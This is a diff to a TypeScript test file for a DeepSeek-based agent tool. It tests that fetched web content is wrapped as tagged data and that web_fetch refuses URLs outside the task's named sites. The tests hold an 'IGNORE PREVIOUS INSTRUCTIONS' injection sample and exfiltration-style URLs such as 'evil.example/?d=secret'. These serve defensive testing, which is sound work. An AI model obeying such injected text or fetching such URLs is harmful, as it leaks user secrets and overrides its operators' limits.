@@ -726,7 +726,7 @@ test('agent: searches the web with DeepSeek; web_fetch opens only result URLs or
   expect(first[0]).toContain('IGNORE PREVIOUS INSTRUCTIONS')
   const second = w.agentRequests[2].messages.filter((m: any) => m.role === 'tool').map((m: any) => m.content)
   expect(second[1]).toMatch(/<data id="\w{12}" source="web page https:\/\/docs.example.com\/a">\n# Docs\n\npage body/)
-  expect(second[2]).toContain('refused: web_fetch only opens URLs')
+  expect(second[2]).toContain('refused: web_fetch only opens URLs from your search results or pages on sites named in the task (task.example)')
   expect(second[3]).toContain('page body') // written in the task
   expect(text(r)).toContain('web: searches=1 fetches=2')
   expect(w.agentRequests[0].tools.map((t: any) => t.function.name)).toEqual(expect.arrayContaining(['web_search', 'web_fetch']))
@@ -827,4 +827,25 @@ test('agent: progress lines show long paths by their last two parts', async ($, 
   expect(w.logs[0]).toBe('DeepSeek agent started: Fix …/agent-trial/textstats.py')
   expect(w.logs[1]).toBe('DeepSeek agent · turn 1/12: read …/agent-trial/textstats.py')
   expect(text(r)).toContain(`read ${deep}`) // the report to Claude keeps the full path
+})
+
+test('agent: web_fetch opens any page of a site named in the task, and nothing else', async ($, on) => {
+  const urls = [
+    'https://pypi.org/project/requests/', // named as pypi.org
+    'https://www.python.org/downloads/', // a subdomain of python.org
+    'https://docs.python.org.evil.example/x', // only looks like it
+    'https://textstats.py/steal', // a file name in the task, not a site
+    'https://evil.example/?d=secret',
+  ]
+  const w = world(on, [{ content: 'x' }], {
+    agentSteps: [{ calls: urls.map(url => ['web_fetch', { url }] as [string, Record<string, unknown>]) }, { calls: [['finish', { summary: 's' }]] }],
+  })
+  await start($)
+  await $.tool.call({ tool: AGENT, task: 'Look up the latest versions on python.org and pypi.org; then update textstats.py and test_versions.py.' } as any)
+  const out = w.agentRequests[1].messages.filter((m: any) => m.role === 'tool').map((m: any) => m.content)
+  expect(out[0]).toContain('page body')
+  expect(out[1]).toContain('page body')
+  expect(out[2]).toContain('refused')
+  expect(out[3]).toContain('refused')
+  expect(out[4]).toContain('refused: web_fetch only opens URLs from your search results or pages on sites named in the task (python.org, pypi.org)')
 })
